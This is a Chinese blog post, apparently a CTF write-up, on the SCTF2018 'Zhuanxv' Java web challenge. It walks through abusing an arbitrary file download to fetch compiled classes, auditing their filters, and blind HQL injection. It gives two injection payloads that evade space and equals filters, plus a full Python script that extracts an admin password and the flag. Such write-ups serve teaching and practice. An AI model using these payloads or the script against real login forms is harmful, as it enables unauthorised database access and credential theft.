@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>SCTF2018-Zhuanxv Writeup | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="题目描述的场景是扫到了一个web应用。新手开发者把说明放到了github上，在github发现的后台中发现了一个任意文件下载和hql注入点。他想把整个库脱下来（得到库中flag），这就利用到了java web的知识。题目是SSH框架编写，hibernate支持HQL语句，对于新手有这样几个盲点：  任意文件下载该下载什么：下载xml文件和java编译后的class文件 HQL语句和过滤语句放在哪里">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF2018-Zhuanxv Writeup">
+<meta property="og:url" content="http://hebic.me/2018/06/20/SCTF2018-Zhuanxv-Writeup/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="题目描述的场景是扫到了一个web应用。新手开发者把说明放到了github上，在github发现的后台中发现了一个任意文件下载和hql注入点。他想把整个库脱下来（得到库中flag），这就利用到了java web的知识。题目是SSH框架编写，hibernate支持HQL语句，对于新手有这样几个盲点：  任意文件下载该下载什么：下载xml文件和java编译后的class文件 HQL语句和过滤语句放在哪里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-06-20T14:08:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF2018-Zhuanxv Writeup">
+<meta name="twitter:description" content="题目描述的场景是扫到了一个web应用。新手开发者把说明放到了github上，在github发现的后台中发现了一个任意文件下载和hql注入点。他想把整个库脱下来（得到库中flag），这就利用到了java web的知识。题目是SSH框架编写，hibernate支持HQL语句，对于新手有这样几个盲点：  任意文件下载该下载什么：下载xml文件和java编译后的class文件 HQL语句和过滤语句放在哪里">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一步：信息收集"><span class="toc-text">第一步：信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二步：下载源码"><span class="toc-text">第二步：下载源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三步：代码审计"><span class="toc-text">第三步：代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四步：HQL注入"><span class="toc-text">第四步：HQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注入第一步："><span class="toc-text">注入第一步：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入第二步："><span class="toc-text">注入第二步：</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-SCTF2018-Zhuanxv-Writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">SCTF2018-Zhuanxv Writeup</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.06.20</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2018/06/20/SCTF2018-Zhuanxv-Writeup/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>题目描述的场景是扫到了一个web应用。新手开发者把说明放到了github上，在github发现的后台中发现了一个任意文件下载和hql注入点。他想把整个库脱下来（得到库中flag），这就利用到了java web的知识。题目是SSH框架编写，hibernate支持HQL语句，对于新手有这样几个盲点：</p>
+<ol>
+<li>任意文件下载该下载什么：下载xml文件和java编译后的class文件</li>
+<li>HQL语句和过滤语句放在哪里：github的commit的删除doc中提到<code>实现类存放在接口同级impl目录下，命名规则\&lt;interfaceName\&gt;Impl.java</code> 这里的\\&lt;是markdown语句，所以并不是文件夹分隔符。</li>
+<li>hql查询对象不是表名是实体名</li>
+<li>hql查询限制很大</li>
+</ol>
+<h2 id="第一步：信息收集"><a href="#第一步：信息收集" class="headerlink" title="第一步：信息收集"></a>第一步：信息收集</h2><p>信息收集，发现github上遗留的说明。<a href="https://github.com/Lazyboxx/zhuanxvapplication" target="_blank" rel="noopener">https://github.com/Lazyboxx/zhuanxvapplication</a> 根据提供的url进入登录地址，发现用户名密码已经无法登陆</p>
+<h2 id="第二步：下载源码"><a href="#第二步：下载源码" class="headerlink" title="第二步：下载源码"></a>第二步：下载源码</h2><p>查看网页源代码，发现背景图片的加载方式使用<code>./loadimage?fileName=web_login_bg.jpg</code> ，找到任意文件下载点，下载一系列文件。这里限制了下载文件的后缀只有class xml jpg css等。</p>
+<h2 id="第三步：代码审计"><a href="#第三步：代码审计" class="headerlink" title="第三步：代码审计"></a>第三步：代码审计</h2><p>根据github的commit记录 <a href="https://github.com/Lazyboxx/zhuanxvapplication/commit/3f34f9b15cf2be3a03ed5f19d9d71cf6427b0111" target="_blank" rel="noopener">https://github.com/Lazyboxx/zhuanxvapplication/commit/3f34f9b15cf2be3a03ed5f19d9d71cf6427b0111</a> 了解实现类的位置。</p>
+<p>从user.hbm.xml得知表名和类名映射</p>
+<p>从com/cuitctf/service/impl/UserServiceImpl.class得知过滤规则，用户名只过滤空格和等号，密码限制只能字母+数字</p>
+<p>从com/cuitctf/dao/impl/UserDaoImpl.class得知hql语句，变量拼接导致hql注入</p>
+<h2 id="第四步：HQL注入"><a href="#第四步：HQL注入" class="headerlink" title="第四步：HQL注入"></a>第四步：HQL注入</h2><p>HQL需要两步，第一步注入得到管理员密码，第二步根据密码盲注得到flag</p>
+<h3 id="注入第一步："><a href="#注入第一步：" class="headerlink" title="注入第一步："></a>注入第一步：</h3><p>用户名：<code>aaa&#39;%0aor%0a(select%0asubstring(password,1,1)%0afrom%0aUser%0awhere%0aname%0alike%0a&#39;homamamama&#39;)%0alike%0a&#39;a&#39;%0aor%0a&#39;&#39;like&#39;</code></p>
+<p>密码：随意</p>
+<p>盲注得到homamamama的密码：6yhn7ujm</p>
+<h3 id="注入第二步："><a href="#注入第二步：" class="headerlink" title="注入第二步："></a>注入第二步：</h3><p>用户名：<code>aa&#39;%0aor%0a(select%0asubstring(welcometoourctf,1,1)%0afrom%0aFlag)%0alike%0a&#39;a&#39;%0aand%0a&#39;&#39;like&#39;</code></p>
+<p>密码：6yhn7ujm</p>
+<p>得到flag：sctf{C46E250926A2DFFD831975396222B08E}</p>
+<p>备注：需要注意的是过滤了等号，可以用like绕过，需要考虑%和_的全匹配性质，答案中没有这两个符号，写脚本的时候注意避开这两个字符的猜测。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ip/zhuanxvlogin"</span></span><br><span class="line"><span class="comment"># url = "http://localhost:9090/zhuanxvlogin"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">	admin_password = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">			guess = chr(n)</span><br><span class="line">			<span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			username = <span class="string">"aaa'\nor\n(select\nsubstring(password,"</span>+str(i)+<span class="string">",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"</span>+guess+<span class="string">"'\nor\n''like'"</span></span><br><span class="line">			data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: <span class="string">"a"</span>&#125;</span><br><span class="line">			req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">			<span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">				admin_password = admin_password + guess</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"admin password: "</span>+ admin_password</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> admin_password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second</span><span class="params">(admin_password)</span>:</span></span><br><span class="line">	flag = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		<span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">			guess = chr(n)</span><br><span class="line">			<span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			username = <span class="string">"aa'\nor\n(select\nsubstring(welcometoourctf,"</span>+str(i)+<span class="string">",1)\nfrom\nFlag)\nlike\n'"</span>+guess+<span class="string">"'\nand\n''like'"</span></span><br><span class="line">			data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: admin_password&#125;</span><br><span class="line">			req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">			<span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">				flag = flag + guess</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"flag:"</span> + flag</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">admin_password = first()	</span><br><span class="line">second(admin_password)</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/06/13/JWT安全问题/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2018/09/20/CVE-2017-7525-jackson-rce主线流程分析/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2018/06/20/SCTF2018-Zhuanxv-Writeup/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
